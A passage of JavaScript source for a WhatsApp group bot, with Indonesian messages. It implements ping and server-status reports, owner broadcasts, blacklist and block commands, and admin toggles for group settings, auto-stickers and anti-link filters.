cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()

    const createProgressBar = (value, maxValue, length) => {
      const percentage = value / maxValue;
      const progress = Math.round(length * percentage);
      const empty = length - progress;
      return `[${"█".repeat(progress)}${"░".repeat(empty)}]`;
    }

    let progress = 0
    const progressBar = createProgressBar(progress, 100, 20)

    // Pesan awal loading
    let message = await RyuuBotz.sendMessage(
      m.chat,
      {
        text: `Melakukan tes...\n${progressBar} ${progress}%`,
      },
      { quoted: m }
    )

    // Progress bar animation
    while (progress < 100) {
      await global.sleep(100)
      progress += 5
      const newProgressBar = createProgressBar(progress, 100, 20)
      const newText = `Melakukan tes...\n${newProgressBar} ${progress}%`

      await RyuuBotz.relayMessage(
        m.chat,
        {
          protocolMessage: {
            key: message.key,
            type: 14,
            editedMessage: { conversation: newText }
          }
        },
        {}
      )
    }

    await global.sleep(500)

    const finalTeks = `Tes berjalan sukses, sedang menampilkan status bot....`
    const finalText = `
\`ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ\`

🕒 ᴋᴇᴄᴇᴘᴀᴛᴀɴ : ${latensi.toFixed(4)} ᴅᴇᴛɪᴋ
⏳ ᴀᴋᴛɪғ : ${runtime(process.uptime())}

👤 ᴘᴇɴɢɢᴜɴᴀ : *${Object.keys(global.db.users).length}*
📲 ᴍᴏᴅᴇ : *${RyuuBotz.public ? 'ᴘᴜʙʟɪᴄ' : 'sᴇʟғ'}*

📡 ɪɴғᴏ sᴇʀᴠᴇʀ
━━━━━━━━━━━━━━━
💾 RAM : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

📁 Disk : ${useds}B / ${totals}B (${percents})
📂 Free : ${availables}B

🧠 CPU : User ${(100 * cpu.times.user / cpu.total).toFixed(1)}% | Sys ${(100 * cpu.times.sys / cpu.total).toFixed(1)}% | Idle ${(100 * cpu.times.idle / cpu.total).toFixed(0)}%
- ${cpus[0].model.trim()} (${cpus.length} Cores)
━━━━━━━━━━━━━━━

✨ ᴋᴀʟᴀᴜ ᴀᴅᴀ ᴋᴇʙᴜᴛʜᴀɴ ʟᴀɪɴɴʏᴀ ᴋᴀʙᴀʀɪɴ ᴀʀɪsᴜ ʏᴀ~ ✨
`.trim();
    

    // Edit pesan terakhir ke teks final pendek
    await RyuuBotz.relayMessage(
      m.chat,
      {
        protocolMessage: {
          key: message.key,
          type: 14,
          editedMessage: { conversation: finalTeks }
        }
      },
      {}
    )

    // Kirim pesan lengkap dengan thumbnail eksternal
    RyuuBotz.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
    await RyuuBotz.sendMessage(m.chat, {
      text: finalText,
      contextInfo: {
        externalAdReply: {
          title: 'ᴋᴇᴄᴇᴘᴀᴛᴀɴ ʙᴏᴛ',
          body: `${latensi.toFixed(4)} ᴅᴇᴛɪᴋ\n${oldd - neww} _miliseconds_`,
          thumbnailUrl: 'https://files.catbox.moe/m2xkzf.jpg',
          sourceUrl: global.saluran,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m })

  } catch (e) {
    console.error("Error di case 'ping':", e)
    await RyuuBotz.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
    reply("Terjadi kesalahan saat menjalankan info lanjutan.")
  }
}
break
case "test":
        {
          try {
            const createProgressBar = (value, maxValue, length) => {
              const percentage = value / maxValue;
              const progress = Math.round(length * percentage);
              const empty = length - progress;
              return `[${"█".repeat(progress)}${"░".repeat(empty)}]`;
            };
            let progress = 0;
            const progressBar = createProgressBar(progress, 100, 20);
            let message = await RyuuBotz.sendMessage(
              m.chat,
              {
                text: `Loading...\n${progressBar} ${progress}%`,
              },
              { quoted: m }
            );
            while (progress < 100) {
              await global.sleep(750);
              progress += 5;
              const newProgressBar = createProgressBar(progress, 100, 20);
              const newText = `Loading...\n${newProgressBar} ${progress}%`;
              await RyuuBotz.relayMessage(
                m.chat,
                {
                  protocolMessage: {
                    key: message.key,
                    type: 14,
                    editedMessage: { conversation: newText },
                  },
                },
                {}
              );
            }
            await global.sleep(500);
            const finalText = `Arisu on!!`;
            //const finalText = `Arisu on!!! \n[████████████████████] 100%`;
            await RyuuBotz.relayMessage(
              m.chat,
              {
                protocolMessage: {
                  key: message.key,
                  type: 14,
                  editedMessage: { conversation: finalText },
                },
              },
              {}
            );
          } catch (e) {
            console.error("Error di case test:", e);
            reply("Terjadi kesalahan saat menjalankan tes.");
          }
        }
        break
        case 'advance-info':
        case 'advp':
        case 'advance-ping': {
  try {
    const used = process.memoryUsage()
    const cpus = os.cpus().map(cpu => {
      cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
      return cpu
    })
    const cpu = cpus.reduce((last, cpu, _, { length }) => {
      last.total += cpu.total
      last.speed += cpu.speed / length
      last.times.user += cpu.times.user
      last.times.nice += cpu.times.nice
      last.times.sys += cpu.times.sys
      last.times.idle += cpu.times.idle
      last.times.irq += cpu.times.irq
      return last
    }, {
      speed: 0,
      total: 0,
      times: {
        user: 0,
        nice: 0,
        sys: 0,
        idle: 0,
        irq: 0
      }
    })

    const timestamp = speed()
    const latensi = speed() - timestamp
    const neww = performance.now()
    const oldd = performance.now()

    const createProgressBar = (value, maxValue, length) => {
      const percentage = value / maxValue;
      const progress = Math.round(length * percentage);
      const empty = length - progress;
      return `[${"█".repeat(progress)}${"░".repeat(empty)}]`;
    }

    let progress = 0
    const progressBar = createProgressBar(progress, 100, 20)

    // Pesan awal loading
    let message = await RyuuBotz.sendMessage(
      m.chat,
      {
        text: `Loading...\n${progressBar} ${progress}%`,
      },
      { quoted: m }
    )

    // Progress bar animation
    while (progress < 100) {
      await global.sleep(100)
      progress += 5
      const newProgressBar = createProgressBar(progress, 100, 20)
      const newText = `Loading...\n${newProgressBar} ${progress}%`

      await RyuuBotz.relayMessage(
        m.chat,
        {
          protocolMessage: {
            key: message.key,
            type: 14,
            editedMessage: { conversation: newText }
          }
        },
        {}
      )
    }

    await global.sleep(500)

    const finalTeks = `Arisu on!!`
    const finalText = `
Response Speed: ${latensi.toFixed(4)} _Second_ \n${oldd - neww} _miliseconds_

Runtime: ${runtime(process.uptime())}

💻 *Info Server*
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHz)
${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}

_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHz)
${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()

    // Edit pesan terakhir ke teks final pendek
    await RyuuBotz.relayMessage(
      m.chat,
      {
        protocolMessage: {
          key: message.key,
          type: 14,
          editedMessage: { conversation: finalTeks }
        }
      },
      {}
    )

    // Kirim pesan lengkap dengan thumbnail eksternal
    await RyuuBotz.sendMessage(m.chat, {
      text: finalText,
      contextInfo: {
        externalAdReply: {
          title: 'ᴋᴇᴄᴇᴘᴀᴛᴀɴ ʙᴏᴛ',
          body: `${latensi.toFixed(4)} ᴅᴇᴛɪᴋ\n${oldd - neww} _miliseconds_`,
          thumbnailUrl: 'https://files.catbox.moe/m2xkzf.jpg',
          sourceUrl: global.saluran,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m })

  } catch (e) {
    console.error("Error di case 'advance-info':", e)
    reply("Terjadi kesalahan saat menjalankan info lanjutan.")
  }
}
break
          case 'bctext': case 'broadcasttext': case 'broadcast': {
			    if (!isRyuuTheCreator) return reply(mess.only.owner)
		            if (!q) return replyReinzID(`Masukkan teks`)
		        const data = await store.chats.all()
        for (let i of data) {
           RyuuBotz.sendMessage(i.id, {text: `${ownername}'s Siaran\n\nPesan : ${q}` })
           await sleep(1000)
        }
        }
        break
        case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if(!isRyuuTheCreator) return reply(mess.only.owner)
        if (!q) return replyReinzID(`Masukkan teks`)
        let getGroups = await RyuuBotz.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        replyReinzID(` Menyiarkan dalam ${xeoncast.length} Obrolan Grup, dalam ${xeoncast.length * 1,5} detik`)
        for (let i of xeoncast) {
let txt = `${ownername}'s Siaran\n\nPesan : ${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await RyuuBotz.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await RyuuBotz.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        replyReinzID(`Berhasil Disiarkan di Grup ${xeoncast.length}`)      
        break;
        case 'listblacklist': {
  const fs = require('fs')
  const path = './node_modules/Arisu-MD/database/blacklist.json'

  const getBlacklist = () => {
    try {
      return JSON.parse(fs.readFileSync(path))
    } catch {
      return []
    }
  }

  const blacklist = getBlacklist()
  if (!isAdmins) return reply(mess.admin)

  if (blacklist.length === 0) {
    return reply('📭 Belum ada nomor yang di-blacklist.')
  }

  let teks = `📵 *Daftar Nomor Blacklist:*\n\n`
  for (let nomor of blacklist) {
    teks += `- @${nomor.replace(/@.+/, '')}\n`
  }
  teks += `\n*Total: ${blacklist.length}*`

  await RyuuBotz.sendMessage(m.chat, {
    text: teks.trim()
  }, { quoted: m })
}
break
        case 'unblacklist': {
  const fs = require('fs')
  const path = './node_modules/Arisu-MD/database/blacklist.json'

  const getBlacklist = () => {
    try {
      return JSON.parse(fs.readFileSync(path))
    } catch {
      return []
    }
  }

  const saveBlacklist = (data) => {
    fs.writeFileSync(path, JSON.stringify(data, null, 2))
  }

  const blacklist = getBlacklist()
  if (!isAdmins) return reply(mess.admin)

  const target =
    m.quoted?.sender ||
    (m.mentionedJid && m.mentionedJid[0]) ||
    (args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net')

  if (!target || !target.endsWith('@s.whatsapp.net')) {
    return reply(`*Contoh:* ${prefix + command} 62xxxxxxxxxx\nAtau reply/tag user`)
  }

  if (!blacklist.includes(target)) {
    return reply('Nomor tersebut tidak ada dalam blacklist.')
  }

  const updated = blacklist.filter(x => x !== target)
  saveBlacklist(updated)

  const teks = `✅ Berhasil menghapus blacklist:\n@${target.replace(/@.+/, '')}`
  await RyuuBotz.sendMessage(m.chat, {
    text: teks.trim(),
    mentions: [target]
  }, { quoted: m })
}
break
case 'blacklist': {
  const fs = require('fs')
  const path = './node_modules/Arisu-MD/database/blacklist.json'

  const getBlacklist = () => {
    try {
      return JSON.parse(fs.readFileSync(path))
    } catch {
      return []
    }
  }

  const saveBlacklist = (data) => {
    fs.writeFileSync(path, JSON.stringify(data, null, 2))
  }

  const blacklist = getBlacklist()
  if (!isAdmins) return reply(mess.admin)

  const target =
    m.quoted?.sender ||
    (m.mentionedJid && m.mentionedJid[0]) ||
    (args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net')

  if (!target || !target.endsWith('@s.whatsapp.net')) {
    return reply(`*Contoh:* ${prefix + command} 62xxxxxxxxxx\nAtau reply/tag user`)
  }

  if (blacklist.includes(target)) {
    return reply('Nomor tersebut sudah ada di blacklist.')
  }

  blacklist.push(target)
  saveBlacklist(blacklist)

  const teks = `✅ Berhasil mem-blacklist:\n@${target.replace(/@.+/, '')}`
  await RyuuBotz.sendMessage(m.chat, {
    text: teks.trim(),
    mentions: [target]
  }, { quoted: m })
}
break
case 'block': case 'ban': {
		if (!isRyuuTheCreator) return reply(mess.only.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await RyuuBotz.updateBlockStatus(users, 'block')
		await replyReinzID(`sukses kak`)
	}
	break
        case 'unblock': case 'unban': {
		if (!isRyuuTheCreator) return reply(mess.only.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await RyuuBotz.updateBlockStatus(users, 'unblock')
		await replyReinzID(`sukses kak`)
	}
	break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
	const lisben = "Total Block: " + banUser.length
	replyReinzID(lisben)
	}
	break;
case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
RyuuBotz.groupRevokeInvite(m.chat)
}
break
            case 'react': {
if (!isRyuuTheCreator) return reply(mess.only.owner)
reactionMessage = {
react: {
    text: args[0],
    key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
}
}
RyuuBotz.sendMessage(m.chat, reactionMessage)
            }
            break
case 'group': case 'gc open': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!q) return replyReinzID(`Send orders ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
if (args[0] == 'close') {
  reply(`┌─┉─ • ─┉─  ── .✦
│
│𝘆𝝰𝗵 𝗶𝘁'𝘀 𝘁𝗶𝗺𝗲 𝘁𝝾 𝗰𝗹𝝾𝘀𝗲𝗱
│𝗻𝝰𝗻𝘁𝗶 𝗱𝗶𝗯𝘂𝗸𝝰 𝗹𝝰𝗴𝗶 𝘆𝝰𝝰...
│
└─┉─¡! • !¡─┉─ ── .✦`)
RyuuBotz.groupSettingUpdate(from, 'announcement')
} else if (args[0] == 'open') {
  reply(`♥︎ ۪۪┈─𝗵𝝰𝗹𝝾 𝗶𝘁'𝘀 𝘁𝗶𝗺𝗲 𝘁𝝾 𝝾𝗽𝗲𝗻──────╮

╭── ࣪ 𖥻 ๋ 📜 *𝐐𝘂𝝾𝘁𝗲𝘀*
┊   ―"𝘀𝗲𝗯𝝰𝗯 𝗵𝗶𝗱𝘂𝗽 𝘁𝗲𝗿𝗹𝝰𝗹𝘂 
┊𝘀𝗶𝗻𝗴𝗸𝝰𝘁 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗺𝗯𝗶𝝰𝗿𝗸𝝰𝗻
┊𝝾𝗿𝝰𝗻𝗴 𝗹𝝰𝗶𝗻 𝗺𝗲𝗻𝗲𝗻𝘁𝘂𝗸𝝰𝗻 𝝰𝗽𝝰
┊𝘆𝝰𝗻𝗴 𝗺𝗲𝗺𝗯𝘂𝝰𝘁 𝗸𝗶𝘁𝝰 𝗯𝝰𝗵𝝰𝗴𝗶𝝰"
╰─────────────────

𝗷𝝰𝗻𝗴𝝰𝗻 𝗹𝘂𝗽𝝰 𝗯𝗲𝗿𝘀𝘆𝘂𝗸𝘂𝗿 𝘆𝝰 𝗯𝘂𝝰𝘁 𝗵𝝰𝗿𝗶 𝗶𝗻𝗶...`)
RyuuBotz.groupSettingUpdate(from, 'not_announcement')
} else {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/thumb.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH BUKA/TUTUP ♨️",
                "sections":[{
                  "title":"PILIH BUKA/TUTUP ",
                  "rows":[{
                    "header":"BUKA ✅",
                    "title":"MEMILIH ",
                    "description":"BUKA✅",
                    "id":"${prefix + command} open"
                  },
                  {
                    "header":"TUTUP ❌",
                    "title":"MEMILIH ",
                    "description":"TUTUP ❌",
                    "id":"${prefix + command} close"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363419382206255@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });
await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
}}
break
case 'autostickergc':
            case 'autosticker':
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (args.length < 1) return replyReinzID('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return replyReinzID(`Already activated`)
autosticker.push(from)
fs.writeFileSync('./node_modules/Arisu-MD/database/autosticker.json', JSON.stringify(autosticker))
replyReinzID('autosticker activated')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/autosticker.json', JSON.stringify(autosticker))
replyReinzID('auto sticker deactivated')
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (antiVirtex) return replyReinzID('Already activated')
ntvirtex.push(from)
fs.writeFileSync('./node_modules/Arisu-MD/database/antivirus.json', JSON.stringify(ntvirtex))
replyReinzID('Success in turning on antivirus in this group')
var groupe = await RyuuBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RyuuBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return replyReinzID('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/antivirus.json', JSON.stringify(ntvirtex))
replyReinzID('Success in turning off antivirus this group')
} else {
  
  }
  }
  break;
  case 'antilinkytvid': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return replyReinzID('Already activated')
ntlinkytvid.push(from)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinkytvideo.json', JSON.stringify(ntwame))
replyReinzID('Success in turning on antiwame in this group')
var groupe = await RyuuBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RyuuBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return replyReinzID('Already deactivated')
let off = ntlinkytvid.indexOf(from)
ntlinkytvid.splice(off, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinkytvideo.json', JSON.stringify(ntlinkytvid))
replyReinzID('Success in turning off antiwame in this group')
} else {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/thumb.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363419382206255@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return replyReinzID('Already activated')
ntilinkytch.push(from)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
replyReinzID('Success in turning on youtube channel antilink in this group')
var groupe = await RyuuBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RyuuBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return replyReinzID('Already deactivated')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
replyReinzID('Success in turning off youtube channel antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/thumb.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363419382206255@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkInstagram) return replyReinzID('Already activated')
ntilinkig.push(from)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replyReinzID('Success in turning on instagram antilink in this group')
var groupe = await RyuuBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RyuuBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return replyReinzID('Already deactivated')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replyReinzID('Success in turning off instagram antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/thumb.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363419382206255@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
        case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkFacebook) return replyReinzID('Already activated')
ntilinkfb.push(from)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replyReinzID('Success in turning on facebook antilink in this group')
var groupe = await RyuuBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RyuuBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return replyReinzID('Already deactivated')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replyReinzID('Success in turning off facebook antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
